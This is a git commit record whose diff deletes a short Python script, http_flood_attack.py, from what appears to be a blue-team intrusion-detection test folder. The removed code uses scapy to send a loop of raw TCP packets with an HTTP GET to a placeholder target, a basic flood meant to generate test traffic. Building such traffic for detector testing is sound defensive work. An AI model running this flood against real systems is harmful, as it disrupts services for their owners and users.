cd0e6e96f7ae05a4e40eaad259e4e3669eb89861
Walid-El-Hioul <walidelhioul000@gmail.com>
2024-08-24 06:31:56 -0700

    Done

--- CyberSecurity/Blue_Team/Mini_Network_IDS/Test_IDS/http_flood_attack.py
+++
@@ -1,8 +0,0 @@
-from scapy.all import *
-
-target_ip = "TARGET_IP"
-target_port = 80
-
-for i in range(1000):  # Adjust the range for intensity
-    packet = IP(dst=target_ip) / TCP(dport=target_port) / Raw(load="GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
-    send(packet)
